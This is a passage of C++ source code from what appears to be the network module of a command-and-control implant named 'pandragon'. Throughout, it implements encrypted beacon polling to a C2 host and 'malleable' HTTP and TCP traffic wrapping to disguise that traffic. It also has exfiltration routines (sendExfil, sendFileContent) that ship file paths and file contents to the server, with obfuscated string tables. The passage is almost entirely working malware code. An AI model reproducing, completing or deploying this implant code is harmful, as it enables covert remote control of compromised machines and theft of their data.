    for (size_t i = 0; i < len; i++) wide[i] = (wchar_t)(unsigned char)narrow[i];
    wide[len] = L'\0';
    return wide;
}

// -- URL-safe base64 encoder (RFC 4648, no padding) ---------------------
// '+' -> '-', '/' -> '_', trailing '=' stripped.
// Returns heap-alloc'd null-terminated string; caller must __free().
static char* b64UrlEncode(const unsigned char* src, size_t srcLen) {
    if (!src || srcLen == 0) return NULL;

    static const char* tbl =
        lcg_encrypt("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_");

    size_t outLen = 4 * ((srcLen + 2) / 3) + 1;
    char*  out    = (char*)__malloc(outLen);
    if (!out) return NULL;

    size_t i = 0, j = 0;
    while (i + 2 < srcLen) {
        out[j++] = tbl[(src[i]              >> 2) & 0x3F];
        out[j++] = tbl[((src[i]   << 4) | (src[i+1] >> 4)) & 0x3F];
        out[j++] = tbl[((src[i+1] << 2) | (src[i+2] >> 6)) & 0x3F];
        out[j++] = tbl[ src[i+2]                             & 0x3F];
        i += 3;
    }
    if (srcLen - i == 2) {
        out[j++] = tbl[(src[i]              >> 2) & 0x3F];
        out[j++] = tbl[((src[i]   << 4) | (src[i+1] >> 4)) & 0x3F];
        out[j++] = tbl[(src[i+1]  << 2)           & 0x3F];
    } else if (srcLen - i == 1) {
        out[j++] = tbl[(src[i] >> 2) & 0x3F];
        out[j++] = tbl[(src[i] << 4) & 0x3F];
    }
    out[j] = '\0';
    return out;
}

// -- URL-safe base64 decoder ------------------------------------------------
// Decodes base64url (with or without padding) to binary.
// Returns heap-alloc'd buffer; caller must __free(). Sets *outLen on success.
static unsigned char* b64UrlDecode(const char* src, size_t srcLen, size_t* outLen) {
    if (!src || srcLen == 0 || !outLen) {
        if (outLen) *outLen = 0;
        return NULL;
    }

    // Build reverse lookup table
    static unsigned char tbl[256];
    static bool initialized = false;
    if (!initialized) {
        // Mark all characters as invalid (0xFF sentinel)
        for (int i = 0; i < 256; i++) tbl[i] = 0xFF;
        for (int i = 0; i < 64; i++) {
            char c = lcg_encrypt("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_")[i];
            tbl[(unsigned char)c] = i;
        }
        initialized = true;
    }

    // Calculate output size with correct formula
    // Base64: 4 chars -> 3 bytes
    // Formula: outSize = (srcLen * 3 + 3) / 4, then subtract padding
    size_t pad = 0;
    if (srcLen >= 2 && src[srcLen-2] == '=') pad = 2;
    else if (srcLen >= 1 && src[srcLen-1] == '=') pad = 1;

    size_t effectiveLen = srcLen - pad;
    size_t outSize = (effectiveLen * 3 + 3) / 4;
    
    // Sanity check: output should never be larger than input
    if (outSize > srcLen) {
        *outLen = 0;
        return NULL;
    }

    unsigned char* out = (unsigned char*)__malloc(outSize + 1);
    if (!out) {
        *outLen = 0;
        return NULL;
    }

    size_t i = 0, j = 0;
    while (i + 4 <= srcLen && src[i] != '=') {
        unsigned char a = tbl[(unsigned char)src[i]];
        unsigned char b = tbl[(unsigned char)src[i+1]];
        unsigned char c = (src[i+2] == '=') ? 0 : tbl[(unsigned char)src[i+2]];
        unsigned char d = (src[i+3] == '=') ? 0 : tbl[(unsigned char)src[i+3]];
        
        // Reject if any character is not in the base64 alphabet
        if (a == 0xFF || b == 0xFF ||
            (src[i+2] != '=' && c == 0xFF) ||
            (src[i+3] != '=' && d == 0xFF)) {
            __free(out);
            *outLen = 0;
            return NULL;
        }

        out[j++] = (a << 2) | (b >> 4);
        if (src[i+2] != '=') out[j++] = (b << 4) | (c >> 2);
        if (src[i+3] != '=') out[j++] = (c << 6) | d;
        i += 4;
    }
    
    // Handle remaining characters
    size_t rem = srcLen - i;
    if (rem == 2) {
        unsigned char a = tbl[(unsigned char)src[i]];
        unsigned char b = tbl[(unsigned char)src[i+1]];
        out[j++] = (a << 2) | (b >> 4);
    } else if (rem == 3) {
        unsigned char a = tbl[(unsigned char)src[i]];
        unsigned char b = tbl[(unsigned char)src[i+1]];
        unsigned char c = tbl[(unsigned char)src[i+2]];
        out[j++] = (a << 2) | (b >> 4);
        out[j++] = (b << 4) | (c >> 2);
    }
    
    *outLen = j;
    return out;
}

// Builds L"<basePath>?<wideQuery>" into a single heap buffer.
// Returns NULL if inputs are too large (bounds check for persistence).
static wchar_t* buildQueryPath(const wchar_t* basePath, const wchar_t* query) {
    size_t   bLen = __wcslen(basePath);
    size_t   qLen = __wcslen(query);
    
    // Bounds check: reject paths > 10KB (prevents integer overflow on malloc)
    if (bLen > 10000 || qLen > 10000) {
        return NULL;
    }
    
    wchar_t* buf  = (wchar_t*)__malloc((bLen + 1 + qLen + 1) * sizeof(wchar_t));
    if (!buf) return NULL;
    size_t i = 0;
    for (size_t k = 0; k < bLen;  k++) buf[i++] = basePath[k];
    buf[i++] = L'?';
    for (size_t k = 0; k < qLen;  k++) buf[i++] = query[k];
    buf[i] = L'\0';
    return buf;
}

// -- Public API -------------------------------------

bool sendData(const char* content, uint32_t flags) {
    if (!s_ntFt || !content) return false;
    c_debugPrint(s_ntFt, "Sending content (as string:) %s", content);

    // If encryption is not disabled, use packet format
    if (!(flags & static_cast<uint32_t>(pandragon::networkFlags::NETWORK_NO_ENCRYPT))) {
        // Generate cryptographically secure random nonce for this packet
        uint8_t nonce[24] = {0};
        if (!generateSecureNonce(s_ntFt, nonce)) {
            // CRITICAL: CSPRNG failure - cannot safely continue
            c_debugPrint(s_ntFt, "[sendContent] CSPRNG failed - aborting packet\n");
            return false;
        }

        // Serialize the packet with encryption
        PandragonRuntime& runtime = PandragonRuntime::getInstance();
        auto packet_result = pandragon::serializePacket(
            g_beacon_id,
            pandragon::b2s_opcode::BEACON_TASK_RESULT,  // Default opcode for content
            getNextSeqNum(),
            nonce,
            reinterpret_cast<const uint8_t*>(content),
            __strlen(content),
            g_crypto_key,
            runtime.getConfig().options.pad,
            runtime.getConfig().pad_max
        );

        if (packet_result.first == pandragon::parse_err::OK) {
            // Send the complete packet to configured check-in endpoint
            bool result = sendExfil(packet_result.second.first, packet_result.second.second, s_path);
            // Clean up allocated packet buffer
            __free(packet_result.second.first);
            return result;
        }
    }

    // Encryption requested but serialization failed - do NOT send plaintext
    return false;
}

bool sendData(const void* content, size_t contentLen,
              uint32_t flags)
{
    if (!s_ntFt || !content || contentLen == 0) return false;
    // If encryption is not disabled, use packet format
    if (!(flags & static_cast<uint32_t>(pandragon::networkFlags::NETWORK_NO_ENCRYPT))) {
        // Generate cryptographically secure random nonce for this packet
        uint8_t nonce[24] = {0};
        if (!generateSecureNonce(s_ntFt, nonce)) {
            // CRITICAL: CSPRNG failure - cannot safely continue
            c_debugPrint(s_ntFt, "[sendFileChunk] CSPRNG failed - aborting packet\n");
            return false;
        }

        // Serialize the packet with encryption
        PandragonRuntime& runtime = PandragonRuntime::getInstance();
        auto packet_result = pandragon::serializePacket(
            g_beacon_id,
            pandragon::b2s_opcode::BEACON_TASK_RESULT,  // Default opcode for content
            getNextSeqNum(),
            nonce,
            static_cast<const uint8_t*>(content),
            contentLen,
            g_crypto_key,
            runtime.getConfig().options.pad,
            runtime.getConfig().pad_max
        );

        if (packet_result.first == pandragon::parse_err::OK) {
            // Send the complete packet to configured check-in endpoint
            bool result = sendExfil(packet_result.second.first, packet_result.second.second, s_path);
            // Clean up allocated packet buffer
            __free(packet_result.second.first);
            return result;
        }
    }

    // Encryption requested but serialization failed - do NOT send plaintext
    return false;
}

std::pair<void*, size_t> getMessage(void) {
    c_debugPrint(s_ntFt, "[getMessage] ENTER: s_ntFt=%p, g_identity_set=%d", (void*)s_ntFt, (int)g_identity_set);
    if (!s_ntFt || !g_identity_set) {
        c_debugPrint(s_ntFt, "[getMessage] Early return: s_ntFt=%p, g_identity_set=%d", (void*)s_ntFt, (int)g_identity_set);
        return { nullptr, 0 };
    }


    // Generate cryptographically secure random nonce for poll request
    uint8_t nonce[24] = {0};
    if (!generateSecureNonce(s_ntFt, nonce)) {
        c_debugPrint(s_ntFt, "[getMessage] CSPRNG failed - aborting poll\n");
        return { nullptr, 0 };
    }

    c_debugPrint(s_ntFt, "[getMessage] Serializing poll packet...");

    size_t cached_bof_len = 0;
    uint8_t* cached_bof_data = BofCacheManager::instance().gatherCachedBofIds(&cached_bof_len);

    PandragonRuntime& runtime = PandragonRuntime::getInstance();
    auto packet_result = pandragon::serializePacket(
        g_beacon_id,
        pandragon::b2s_opcode::BEACON_POLL,  // Poll for tasks
        getNextSeqNum(),
        nonce,
        cached_bof_data,
        cached_bof_len,
        g_crypto_key,
        runtime.getConfig().options.pad,
        runtime.getConfig().pad_max
    );

    if (cached_bof_data) {
        __free(cached_bof_data);
    }

    if (packet_result.first != pandragon::parse_err::OK) {
        c_debugPrint(s_ntFt, "[getMessage] serializePacket failed: %d", (int)packet_result.first);
        return { nullptr, 0 };
    }

    c_debugPrint(s_ntFt, "[getMessage] Packet serialized: %zu bytes", packet_result.second.second);

    // TCP transport: skip base64 encoding, send raw packet bytes directly
    uint8_t* raw_packet = packet_result.second.first;
    size_t raw_packet_len = packet_result.second.second;

    if (isTcpTransport()) {
        auto res = getTransport()(s_ntFt, c2_host, s_path, s_userAgent, s_port, raw_packet, raw_packet_len);
        __free(raw_packet);

        if (!res.first || res.second == 0) {
            return { nullptr, 0 };
        }

        c_VERBOSE(s_ntFt, "Poll sent (TCP POST) - seq_num incremented to %lu", (unsigned long)g_seq_num);

        // Response is raw packet bytes from server; deserialize directly
        using namespace pandragon;

        c_VERBOSE(s_ntFt, "Decoding %zu bytes from server (TCP)\n", res.second);

        auto [parse_result, parsed] = pandragon::deserializePacket(
            static_cast<const uint8_t*>(res.first),
            res.second,
            g_crypto_key,
            true
        );
        __free(res.first);

        if (parse_result != parse_err::OK) {
            c_debugPrint(s_ntFt, "deserializePacket failed: %d", (int)parse_result);
            return { nullptr, 0 };
        }

        if (__memcmp(parsed.beacon_id, g_beacon_id, 8) != 0) {
            c_debugPrint(s_ntFt, "Beacon ID mismatch (TCP)\n");
            if (parsed.decrypted_payload) __free(parsed.decrypted_payload);
            return { nullptr, 0 };
        }

        c_debugPrint(s_ntFt, "Decrypted (TCP): opcode=0x%02x len=%zu\n", parsed.opcode, parsed.decrypted_len);

        size_t total_len = parsed.decrypted_len + 1;
        uint8_t* result = (uint8_t*)__malloc(total_len);
        if (!result) {
            if (parsed.decrypted_payload) __free(parsed.decrypted_payload);
            return { nullptr, 0 };
        }
        result[0] = parsed.opcode;
        if (parsed.decrypted_payload && parsed.decrypted_len > 0) {
            __memcpy(result + 1, parsed.decrypted_payload, parsed.decrypted_len);
        }
        if (parsed.decrypted_payload) __free(parsed.decrypted_payload);
        return { result, total_len };
    }

    // HTTP path: encode to base64, apply wrapper, send via POST or GET
    // Encode packet as URL-safe base64 for query string
    char* b64 = b64UrlEncode(packet_result.second.first, packet_result.second.second);
    __free(raw_packet);

    if (!b64) return { nullptr, 0 };

    // Apply wrapper if configured (prefix + suffix)
    // First expand any macros in prefix/suffix
    char* expanded_prefix = NULL;
    char* expanded_suffix = NULL;
    
    if (g_wrapper_prefix_len > 0) {
        expanded_prefix = expandMacros(g_wrapper_prefix);
    }
    if (g_wrapper_suffix_len > 0) {
        expanded_suffix = expandMacros(g_wrapper_suffix);
    }
    
    char* wrapped = NULL;
    if (expanded_prefix || expanded_suffix) {
        size_t prefix_len = expanded_prefix ? __strlen(expanded_prefix) : 0;
        size_t suffix_len = expanded_suffix ? __strlen(expanded_suffix) : 0;
        size_t b64_len = __strlen(b64);
        size_t wrapped_len = prefix_len + b64_len + suffix_len + 1;
        wrapped = (char*)__malloc(wrapped_len);
        if (wrapped) {
            wrapped[0] = '\0';
            if (prefix_len > 0) {
                __memcpy(wrapped, expanded_prefix, prefix_len);
            }
            __memcpy(wrapped + prefix_len, b64, b64_len);
            if (suffix_len > 0) {
                __memcpy(wrapped + prefix_len + b64_len, expanded_suffix, suffix_len);
            }
            wrapped[wrapped_len - 1] = '\0';
            __free(b64);
            b64 = wrapped;
        }
        if (expanded_prefix) __free(expanded_prefix);
        if (expanded_suffix) __free(expanded_suffix);
    }

    // POST mode: send encrypted poll in request body instead of query string
    if (s_http_method == PCFG_HTTP_METHOD_POST) {
        size_t b64_len = __strlen(b64);
        auto res = getTransport()(s_ntFt, c2_host, s_path, s_userAgent, s_port, b64, b64_len);
        __free(b64);

        if (!res.first || res.second == 0) {
            return { nullptr, 0 };
        }

        c_VERBOSE(s_ntFt, "Poll sent (POST) - seq_num=%lu", (unsigned long)g_seq_num);

        // Server response is base64-encoded encrypted packet; decode it first
        size_t decoded_len = 0;
        unsigned char* decoded = b64UrlDecode((const char*)res.first, res.second, &decoded_len);
        __free(res.first);

        if (!decoded || decoded_len == 0) {
            if (decoded) __free(decoded);
            return { nullptr, 0 };
        }

        // Try to parse as encrypted packet first
        using namespace pandragon;

        c_VERBOSE(s_ntFt, "Decoding %zu bytes from server (POST)\n", decoded_len);

        #ifdef DEBUG
            if (decoded_len >= 46) {
                uint32_t magic = *(uint32_t*)decoded;
                uint8_t version = decoded[4];
                uint32_t payload_len_field = *(uint32_t*)(decoded + 42);
                c_VERBOSE(s_ntFt, "Header: magic=0x%08x ver=%u payload_len=%u\n",
                            (unsigned)magic, (unsigned)version, (unsigned)payload_len_field);
                c_VERBOSE(s_ntFt, "Available payload space: %zu bytes\n", decoded_len - 46);
                (void)magic; (void)version; (void)payload_len_field;
            }
        #endif

        auto [parse_result, parsed] = pandragon::deserializePacket(
            static_cast<const uint8_t*>(decoded),
            decoded_len,
            g_crypto_key,
            true  // direction_s2b = true (server to beacon)
        );

        c_VERBOSE(s_ntFt, "deserializePacket returned: %u\n", (uint8_t)parse_result);

        if (parse_result == parse_err::OK) {
            if (__memcmp(parsed.beacon_id, g_beacon_id, 8) != 0) {
                c_debugPrint(s_ntFt, "Beacon ID mismatch (POST)\n");
                if (parsed.decrypted_payload) __free(parsed.decrypted_payload);
                __free(decoded);
                return { nullptr, 0 };
            }

            c_debugPrint(s_ntFt, "Decrypted (POST): opcode=0x%02x len=%zu\n", parsed.opcode, parsed.decrypted_len);

            size_t total_len = parsed.decrypted_len + 1;
            uint8_t* result = (uint8_t*)__malloc(total_len);
            if (!result) {
                if (parsed.decrypted_payload) __free(parsed.decrypted_payload);
                __free(decoded);
                return { nullptr, 0 };
            }
            result[0] = parsed.opcode;
            if (parsed.decrypted_payload && parsed.decrypted_len > 0) {
                __memcpy(result + 1, parsed.decrypted_payload, parsed.decrypted_len);
            }
            if (parsed.decrypted_payload) __free(parsed.decrypted_payload);
            __free(decoded);
            c_VERBOSE(s_ntFt, "Returning %zu bytes (opcode=0x%02x)\n", total_len, result[0]);
            return { result, total_len };
        } else {
            c_debugPrint(s_ntFt, "deserializePacket returned a value other than OK (POST). Cannot proceed.");
        }

        if (parsed.decrypted_payload) __free(parsed.decrypted_payload);
        __free(decoded);
        return { nullptr, 0 };
    }

    // GET mode: build full path with query string
    wchar_t* full_path = NULL;
    size_t b64_len = __strlen(b64);

    if (g_payload_location_type == PCFG_LOCATION_PATH) {
        // Path mode: targetPath + path_prefix + wrapped + path_suffix
        wchar_t* wPrefix = asciiToWide(g_path_prefix, g_path_prefix_len);
        wchar_t* wSuffix = asciiToWide(g_path_suffix, g_path_suffix_len);
        wchar_t* wB64 = asciiToWide(b64, b64_len);

        size_t pathLen = __wcslen(s_path);
        size_t prefixLen = wPrefix ? __wcslen(wPrefix) : 0;
        size_t suffixLen = wSuffix ? __wcslen(wSuffix) : 0;

        full_path = (wchar_t*)__malloc((pathLen + prefixLen + b64_len + suffixLen + 1) * sizeof(wchar_t));
        if (full_path) {
            full_path[0] = L'\0';
            for (size_t i = 0; i < pathLen; i++) full_path[i] = s_path[i];
            if (wPrefix) {
                for (size_t i = 0; i < prefixLen; i++) full_path[pathLen + i] = wPrefix[i];
            }
            for (size_t i = 0; i < b64_len; i++) full_path[pathLen + prefixLen + i] = (wchar_t)b64[i];
            if (wSuffix) {
                for (size_t i = 0; i < suffixLen; i++) full_path[pathLen + prefixLen + b64_len + i] = wSuffix[i];
            }
            full_path[pathLen + prefixLen + b64_len + suffixLen] = L'\0';
        }
        if (wPrefix) __free(wPrefix);
        if (wSuffix) __free(wSuffix);
        __free(wB64);
    } else {
        // Query param mode
        wchar_t* wB64 = asciiToWide(b64, b64_len);
        if (!wB64) {
            __free(b64);
            return { nullptr, 0 };
        }

        // Build query string with optional param name
        if (g_payload_param_name_len > 0) {
            // Use custom param name: ?param_name=wrapped
            wchar_t* paramName = asciiToWide(g_payload_param_name, g_payload_param_name_len);
            full_path = buildQueryPath(s_path, paramName);
            if (full_path) {
                // Append =wrapped to the path
                size_t pathLen = __wcslen(full_path);
                size_t extraLen = b64_len + 1;
                wchar_t* newPath = (wchar_t*)__malloc((pathLen + extraLen + 1) * sizeof(wchar_t));
                if (newPath) {
                    for (size_t i = 0; i < pathLen; i++) newPath[i] = full_path[i];
                    newPath[pathLen] = L'=';
                    for (size_t i = 0; i < b64_len; i++) newPath[pathLen + 1 + i] = wB64[i];
                    newPath[pathLen + extraLen] = L'\0';
                    __free(full_path);
                    full_path = newPath;
                }
            }
            if (paramName) __free(paramName);
        } else {
            // No param name, just append directly: ?wrapped
            full_path = buildQueryPath(s_path, wB64);
        }
        __free(wB64);
    }

    __free(b64);
    if (!full_path) return { nullptr, 0 };

    // GET request to check-in endpoint with encrypted packet
    auto res = getTransport()(s_ntFt, c2_host, full_path, s_userAgent, s_port, NULL, 0);
    __free(full_path);

    if (!res.first || res.second == 0) {
        return { nullptr, 0 };
    }

    c_VERBOSE(s_ntFt, "Poll sent (GET) - seq_num=%lu", (unsigned long)g_seq_num);

    // Server response is base64-encoded encrypted packet - decode it first
    size_t decoded_len = 0;
    unsigned char* decoded = b64UrlDecode((const char*)res.first, res.second, &decoded_len);
    __free(res.first);  // Free the raw base64 string
    
    if (!decoded || decoded_len == 0) {
        if (decoded) __free(decoded);
        return { nullptr, 0 };
    }

    // Try to parse as encrypted packet first
    using namespace pandragon;

    c_VERBOSE(s_ntFt, "Decoding %zu bytes from server\n", decoded_len);

    // Debug: print first few bytes of decoded buffer
    #ifdef DEBUG
        if (decoded_len >= 46) {
            uint32_t magic = *(uint32_t*)decoded;
            uint8_t version = decoded[4];
            uint32_t payload_len_field = *(uint32_t*)(decoded + 42);
            c_VERBOSE(s_ntFt, "Header: magic=0x%08x ver=%u payload_len=%u\n",
                        (unsigned)magic, (unsigned)version, (unsigned)payload_len_field);
            c_VERBOSE(s_ntFt, "Available payload space: %zu bytes\n", decoded_len - 46);
            /* Silence -Wunused-variable when DEBUG is set but VERBOSE is not */
            (void)magic; (void)version; (void)payload_len_field;
        }
    #endif

    // Parse and decrypt the packet
    auto [parse_result, parsed] = pandragon::deserializePacket(
        static_cast<const uint8_t*>(decoded),
        decoded_len,
        g_crypto_key,
        true  // direction_s2b = true (server to beacon)
    );

    c_VERBOSE(s_ntFt, "deserializePacket returned: %u\n", (uint8_t)parse_result);

    if (parse_result == parse_err::OK) {
        // Verify beacon ID matches ours
        if (__memcmp(parsed.beacon_id, g_beacon_id, 8) != 0) {
            c_debugPrint(s_ntFt, "Beacon ID mismatch\n");
            if (parsed.decrypted_payload) __free(parsed.decrypted_payload);
            __free(decoded);
            return { nullptr, 0 };
        }

        c_debugPrint(s_ntFt, "Decrypted: opcode=0x%02x len=%zu\n", parsed.opcode, parsed.decrypted_len);

        // Prepend opcode to decrypted payload so handleCommand can parse it
        // Format: [opcode (1 byte)] + [decrypted_payload]
        size_t total_len = parsed.decrypted_len + 1;
        uint8_t* result = (uint8_t*)__malloc(total_len);
        if (!result) {
            if (parsed.decrypted_payload) __free(parsed.decrypted_payload);
            __free(decoded);
            return { nullptr, 0 };
        }
        result[0] = parsed.opcode;
        if (parsed.decrypted_payload && parsed.decrypted_len > 0) {
            __memcpy(result + 1, parsed.decrypted_payload, parsed.decrypted_len);
        }
        if (parsed.decrypted_payload) __free(parsed.decrypted_payload);
        __free(decoded);
        c_VERBOSE(s_ntFt, "Returning %zu bytes (opcode=0x%02x)\n", total_len, result[0]);
        return { result, total_len };
    } else {
        c_debugPrint(s_ntFt, "derializePacket returned a value other than OK. Cannot proceed with this packet.");
    }

    // Not an encrypted packet - return raw response (legacy fallback)
    if (parsed.decrypted_payload) __free(parsed.decrypted_payload);
    __free(decoded);
    return { nullptr, 0 };
}

// ============================================================================
// sendExfil Helpers
// ============================================================================

static char* applyMalleableWrapper(const char* b64Payload) {
    if (!b64Payload) return nullptr;

    char* expanded_prefix = nullptr;
    char* expanded_suffix = nullptr;

    if (g_wrapper_prefix_len > 0) {
        expanded_prefix = expandMacros(g_wrapper_prefix);
    }
    if (g_wrapper_suffix_len > 0) {
        expanded_suffix = expandMacros(g_wrapper_suffix);
    }

    if (!expanded_prefix && !expanded_suffix) {
        return nullptr;  // No wrapper, caller keeps original b64
    }

    size_t prefix_len = expanded_prefix ? __strlen(expanded_prefix) : 0;
    size_t suffix_len = expanded_suffix ? __strlen(expanded_suffix) : 0;
    size_t b64_len = __strlen(b64Payload);
    size_t wrapped_len = prefix_len + b64_len + suffix_len + 1;

    char* wrapped = (char*)__malloc(wrapped_len);
    if (!wrapped) {
        if (expanded_prefix) __free(expanded_prefix);
        if (expanded_suffix) __free(expanded_suffix);
        return nullptr;
    }

    wrapped[0] = '\0';
    if (prefix_len > 0) __memcpy(wrapped, expanded_prefix, prefix_len);
    __memcpy(wrapped + prefix_len, b64Payload, b64_len);
    if (suffix_len > 0) __memcpy(wrapped + prefix_len + b64_len, expanded_suffix, suffix_len);
    wrapped[wrapped_len - 1] = '\0';

    if (expanded_prefix) __free(expanded_prefix);
    if (expanded_suffix) __free(expanded_suffix);

    return wrapped;
}

struct ExfilPathResult {
    wchar_t* path;      // For GET mode
    char* postBody;     // For POST mode (caller must free)
    size_t postBodyLen;
};

static ExfilPathResult buildMalleablePath(const wchar_t* targetPath, const char* wrappedPayload) {
    ExfilPathResult result = { nullptr, nullptr, 0 };
    size_t b64Len = __strlen(wrappedPayload);

    if (s_http_method == PCFG_HTTP_METHOD_POST) {
        result.postBody = (char*)__malloc(b64Len + 1);
        if (result.postBody) {
            __memcpy(result.postBody, wrappedPayload, b64Len);
            result.postBody[b64Len] = '\0';
            result.postBodyLen = b64Len;
        }
        return result;
    }

    // GET mode
    if (g_payload_location_type == PCFG_LOCATION_PATH) {
        wchar_t* wPrefix = asciiToWide(g_path_prefix, g_path_prefix_len);
        wchar_t* wSuffix = asciiToWide(g_path_suffix, g_path_suffix_len);
        wchar_t* wB64 = asciiToWide(wrappedPayload, b64Len);

        size_t pathLen = __wcslen(targetPath);
        size_t prefixLen = wPrefix ? __wcslen(wPrefix) : 0;
        size_t suffixLen = wSuffix ? __wcslen(wSuffix) : 0;

        result.path = (wchar_t*)__malloc((pathLen + prefixLen + b64Len + suffixLen + 1) * sizeof(wchar_t));
        if (result.path) {
            result.path[0] = L'\0';
            for (size_t i = 0; i < pathLen; i++) result.path[i] = targetPath[i];
            if (wPrefix) for (size_t i = 0; i < prefixLen; i++) result.path[pathLen + i] = wPrefix[i];
            for (size_t i = 0; i < b64Len; i++) result.path[pathLen + prefixLen + i] = (wchar_t)wrappedPayload[i];
            if (wSuffix) for (size_t i = 0; i < suffixLen; i++) result.path[pathLen + prefixLen + b64Len + i] = wSuffix[i];
            result.path[pathLen + prefixLen + b64Len + suffixLen] = L'\0';
        }

        if (wPrefix) __free(wPrefix);
        if (wSuffix) __free(wSuffix);
        __free(wB64);
    } else {
        // Query param mode
        wchar_t* wB64 = asciiToWide(wrappedPayload, b64Len);
        if (!wB64) return result;

        if (g_payload_param_name_len > 0) {
            wchar_t* paramName = asciiToWide(g_payload_param_name, g_payload_param_name_len);
            result.path = buildQueryPath(targetPath, paramName);
            if (result.path) {
                size_t pathLen = __wcslen(result.path);
                size_t extraLen = b64Len + 1;
                wchar_t* newPath = (wchar_t*)__malloc((pathLen + extraLen + 1) * sizeof(wchar_t));
                if (newPath) {
                    for (size_t i = 0; i < pathLen; i++) newPath[i] = result.path[i];
                    newPath[pathLen] = L'=';
                    for (size_t i = 0; i < b64Len; i++) newPath[pathLen + 1 + i] = wB64[i];
                    newPath[pathLen + extraLen] = L'\0';
                    __free(result.path);
                    result.path = newPath;
                }
            }
            if (paramName) __free(paramName);
        } else {
            result.path = buildQueryPath(targetPath, wB64);
        }
        __free(wB64);
    }

    return result;
}

static bool sendHttpPayload(const wchar_t* targetPath, const wchar_t* fullPath, const char* postBody, size_t postBodyLen) {
    auto res = std::make_pair<void*, size_t>(nullptr, 0);

    if (s_http_method == PCFG_HTTP_METHOD_POST && postBody && postBodyLen > 0) {
        wchar_t* wPath = (wchar_t*)__malloc((__wcslen(targetPath) + 1) * sizeof(wchar_t));
        if (wPath) {
            size_t len = __wcslen(targetPath);
            for (size_t i = 0; i < len; i++) wPath[i] = targetPath[i];
            wPath[len] = L'\0';
            res = getTransport()(s_ntFt, c2_host, wPath, s_userAgent, s_port, postBody, postBodyLen);
            __free(wPath);
        }
        __free((void*)postBody);
    } else {
        c_debugPrint(s_ntFt, "[sendHttpPayload] GET: host=%ls, path=%ls", c2_host, fullPath);
        res = getTransport()(s_ntFt, c2_host, fullPath, s_userAgent, s_port, nullptr, 0);
    }

    if (res.first) {
        __free(res.first);
        return true;
    }
    return false;
}

// ============================================================================
// sendExfil - Main orchestration
// ============================================================================

bool sendExfil(const void* content, size_t contentLen, const wchar_t* targetPath) {
    /*
        We should really add maybe an enum, for HTTP-like protocols and TCP-like protocols
        to further abstract this stuff. http-like: requires b64, etc. tcp-like: doesn't.
    */
    
    if (!s_ntFt || !content || contentLen == 0) {
        c_debugPrint(s_ntFt, "[sendExfil] Early return: s_ntFt=%p, content=%p, contentLen=%zu",
                     (void*)s_ntFt, (const void*)content, contentLen);
        return false;
    }

    if(__wcslen(targetPath) == 0) {
        targetPath = s_path;  // Default to check-in path if no targetPath provided
    }
    if (!targetPath) {
        return false;
    }
    c_VERBOSE(s_ntFt, "[sendExfil] ENTER: s_ntFt=%p, content=%p, contentLen=%zu, targetPath=%ls",
                 (void*)s_ntFt, (const void*)content, contentLen, targetPath ? targetPath : L"(null)");

    // TCP transport: send raw bytes directly, skip base64
    if (isTcpTransport()) {
        auto res = getTransport()(s_ntFt, c2_host, targetPath, s_userAgent, s_port, content, contentLen);
        bool ok = (res.first != nullptr && res.second > 0);
        if (res.first) __free(res.first);
        return ok;
    }

    // Base64 encode the encrypted content
    char* b64 = b64UrlEncode((const unsigned char*)content, contentLen);
    if (!b64) {
        c_debugPrint(s_ntFt, "[sendExfil] b64UrlEncode failed!");
        return false;
    }

    // Apply malleable wrapper (prefix + suffix) if configured
    char* wrapped = applyMalleableWrapper(b64);
    bool wrapper_applied = (wrapped != nullptr);
    if (!wrapper_applied) {
        wrapped = b64;  // No wrapper, use b64 as-is
    } else {
        __free(b64);  // Free original b64, wrapped now owns the memory
    }

    // Build request path based on payload location type
    ExfilPathResult pathResult = buildMalleablePath(targetPath, wrapped);
    __free(wrapped);  // Free wrapped payload after path building

    if (s_http_method != PCFG_HTTP_METHOD_POST && !pathResult.path) {
        c_debugPrint(s_ntFt, "[sendExfil] buildMalleablePath returned NULL path");
        return false;
    }

    // Send request
    bool ok = sendHttpPayload(targetPath, pathResult.path, pathResult.postBody, pathResult.postBodyLen);

    if (pathResult.path) __free(pathResult.path);

    return ok;
}

/* ---------------------------------------------------------------------------
 * Send file content response to server (FILE_CONTENT opcode).
 * Uses payload_file_content struct for proper memory layout.
 * --------------------------------------------------------------------------- */
bool pandragon::sendFileContent(const wchar_t* filePath, const uint8_t* fileData, size_t fileSize, uint8_t status) {
    if (!s_ntFt || !filePath) return false;
    
    // Calculate path length in wchar_t (not bytes)
    size_t pathLen = 0;
    while (filePath[pathLen] && pathLen < 255) pathLen++;
    
    // Build payload using struct for proper layout
    size_t payloadSize = sizeof(payload_file_content) + (pathLen * sizeof(wchar_t)) + fileSize;
    payload_file_content* payload = (payload_file_content*)__malloc(payloadSize);
    if (!payload) return false;
    
    // Set header fields
    payload->path_len = (uint16_t)pathLen;
    payload->file_size = (uint32_t)fileSize;
    payload->status = status;
    
    // Copy path immediately after struct
    wchar_t* pathBuffer = (wchar_t*)(payload + 1);
    for (size_t i = 0; i < pathLen; i++) {
        pathBuffer[i] = filePath[i];
    }
    
    // Copy file data after path
    if (fileData && fileSize > 0) {
        uint8_t* dataBuffer = (uint8_t*)(pathBuffer + pathLen);
        __memcpy(dataBuffer, fileData, fileSize);
    }

    // Generate cryptographically secure random nonce for this packet
    uint8_t nonce[24] = {0};
    if (!generateSecureNonce(s_ntFt, nonce)) {
        c_debugPrint(s_ntFt, "[sendFileContent] CSPRNG failed - aborting packet\n");
        __free(payload);
        return false;
    }

    // Serialize with encryption
    PandragonRuntime& runtime = PandragonRuntime::getInstance();
    auto packet_result = pandragon::serializePacket(
        g_beacon_id,
        pandragon::b2s_opcode::FILE_CONTENT,
        getNextSeqNum(),
        nonce,
        reinterpret_cast<const uint8_t*>(payload),
        payloadSize,
        g_crypto_key,
        runtime.getConfig().options.pad,
        runtime.getConfig().pad_max
    );
    
    __free(payload);
    
    if (packet_result.first != pandragon::parse_err::OK) {
        return false;
    }
    
    // Send via configured check-in endpoint
    bool result = sendExfil(packet_result.second.first, packet_result.second.second, s_path);
    __free(packet_result.second.first);
    
    return result;
}

/* ---------------------------------------------------------------------------
 * Send file write result to server (FILE_WRITE_RESULT opcode).
 * Uses payload_file_write_result struct for proper memory layout.
 * --------------------------------------------------------------------------- */
bool pandragon::sendFileWriteResult(uint8_t status) {
    if (!s_ntFt) return false;
    
    // Use struct for proper layout
    payload_file_write_result payload;
    payload.status = status;

    // Generate cryptographically secure random nonce for this packet
